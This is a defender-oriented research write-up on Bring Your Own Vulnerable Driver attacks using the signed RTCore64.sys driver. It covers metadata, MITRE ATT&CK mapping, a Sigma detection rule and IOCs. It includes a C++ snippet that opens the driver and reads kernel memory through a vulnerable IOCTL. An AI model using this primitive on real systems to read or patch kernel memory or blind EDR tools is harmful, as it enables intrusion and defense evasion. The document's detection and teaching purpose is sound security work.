# Bring Your Own Vulnerable Driver (BYOVD): Understanding Kernel-Mode Abuse

## Executive Summary & Key Takeaways
In modern Windows security architectures, the kernel boundary (Ring 0) is heavily guarded. Windows enforces Kernel-Mode Code Signing (KMCS), ensuring that only drivers cryptographically signed by trusted authorities or Microsoft itself can load into kernel space. However, threat actors have found an elegant, highly effective bypass: **Bring Your Own Vulnerable Driver (BYOVD)**.

*   **Attack Vector:** Instead of writing a kernel exploit from scratch or attempting to sign a malicious driver, an attacker installs a legitimate, signed driver that contains a known security flaw (e.g., arbitrary physical memory read/write) and exploits that flaw from user mode (Ring 3) to compromise kernel memory.
*   **Primary Objective:** Defeating Endpoint Detection and Response (EDR) agents by patching their active processes and notification callbacks directly in Ring 0.
*   **Key Finding:** Threat actors frequently abuse legitimate utilities like the Micro-Star MSI Ambient Light driver (`RTCore64.sys`) because it contains highly permissive, arbitrary read/write primitives exposed through IOCTLs.

---

## Sample Metadata
Providing exact metadata is critical for threat intelligence verification and hash blocking:

| Attribute | Details |
| :--- | :--- |
| **File Name** | `RTCore64.sys` |
| **Description** | Micro-Star MSI Afterburner Hardware Monitoring Driver |
| **Architecture** | x64 PE executable |
| **Size** | 61,048 bytes |
| **SHA-256 Hash** | `c022848993fbfedce79a3a928402c7fecb962d29fa4d2026d58ffd630f9a2b22` |
| **Known Vulnerability** | CVE-2019-16098 (Arbitrary physical/virtual memory read/write) |

---

## Technical Analysis & Exploit Mechanics
Most vulnerable drivers expose read/write primitives to user mode through input/output control (IOCTL) codes. When a user-mode application calls `DeviceIoControl`, the kernel routes the request to the driver's dispatch routine. If the driver fails to validate the buffer addresses or checks, it creates a security loophole.

For example, the vulnerable driver `RTCore64.sys` exposes IOCTLs that read and write physical and virtual memory. Below is a conceptual illustration of how a user-mode application interacts with this primitive:

```cpp
// Open a handle to the vulnerable driver
HANDLE hDevice = CreateFileW(
    L"\\\\.\\RTCore64",
    GENERIC_READ | GENERIC_WRITE,
    0,
    NULL,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    NULL
);

if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Failed to obtain driver handle: %d\n", GetLastError());
    return;
}

// Struct for RTCore64 read/write operations
struct RT_MEMORY_READ {
    DWORD Address;
    BYTE Size; // 1, 2, or 4 bytes
    DWORD Value;
};

// Reading a kernel virtual address via IOCTL 0x80002048
RT_MEMORY_READ readReq;
readReq.Address = targetKernelAddress;
readReq.Size = 4;
readReq.Value = 0;

DWORD bytesReturned;
BOOL success = DeviceIoControl(
    hDevice,
    0x80002048, // Vulnerable read IOCTL
    &readReq, sizeof(readReq),
    &readReq, sizeof(readReq),
    &bytesReturned,
    NULL
);

if (success) {
    printf("[+] Kernel Data at 0x%08X: 0x%08X\n", targetKernelAddress, readReq.Value);
}
```

---

## MITRE ATT&CK Mapping
Mapping observed attacker actions against standard industry TTPs:

| Tactic | Technique ID | Technique Name | Use Case in BYOVD |
| :--- | :--- | :--- | :--- |
| **Defense Evasion** | T1562.001 | Impair Defenses: Disable or Modify Tools | Attackers use the kernel write primitive to patch EDR system routines and processes. |
| **Privilege Escalation** | T1068 | Exploitation for Privilege Escalation | Exploiting driver IOCTL vulnerabilities from user mode (Ring 3) to execute kernel-mode read/write instructions (Ring 0). |
| **Persistence** | T1543.003 | Create or Modify System Process: Windows Service | Attacker registers a temporary Windows service to force-load the vulnerable driver. |

---

## Detection Engineering & Rules
Defending against BYOVD is primarily about restricting driver load operations and auditing events.

### Sigma Detection Rule
Here is a Sigma rule pattern designed to detect the loading of `RTCore64.sys` based on its driver name or hash:

```yaml
title: Vulnerable RTCore64 Driver Load
id: 9a5d5c58-48be-4cc5-9ab3-5c0dbfa11440
status: experimental
description: Detects the load of RTCore64.sys, a frequently abused driver in BYOVD attacks.
author: Anish Anandhan A L
logsource:
    product: windows
    service: sysmon
detection:
    selection_sysmon:
        EventID: 6
    selection_driver:
        ImageLoaded|endswith:
            - '\RTCore64.sys'
            - '\RTCore32.sys'
    condition: selection_sysmon and selection_driver
falsepositives:
    - Legitimate MSI utility installations (rare in enterprise servers)
level: high
```

:::info
**Detection Tip:** Keep an eye on non-standard drivers being registered by non-system processes. In Splunk, search for Sysmon EventID 6 where the driver path is in `C:\Users\*` or `C:\Windows\Temp\*`.
:::

---

## Indicators of Compromise (IOCs)
Use these indicators to audit systems for signs of compromise:

| Artifact Type | Indicator | Description / Details |
| :--- | :--- | :--- |
| **File Path** | `C:\Windows\System32\drivers\RTCore64.sys` | Standard installation location for the driver |
| **File SHA-256** | `c022848993fbfedce79a3a928402c7fecb962d29fa4d2026d58ffd630f9a2b22` | Vulnerable driver hash |
| **Service Name** | `RTCore64` | Driver service registered in Windows Registry |
| **Symbolic Link** | `\\.\RTCore64` | Symbolic link used by user-mode applications |

---

## Research Reflections & Lessons Learned
*   **The Challenge:** Connecting user-mode handle allocation to raw physical memory mapping was a major conceptual challenge. It highlighted the importance of understanding the Windows IO Manager and how I/O Request Packets (IRPs) are handled at the driver entry point.
*   **Key Takeaway:** Digital signatures are not a guarantee of security. A signed driver simply confirms identity, not the absence of severe logical vulnerabilities.
*   **Next Steps:** I plan to build a test laboratory using WDAC (Windows Defender Application Control) driver audit rules and test blocklist deployment configurations to observe real-world block rates.
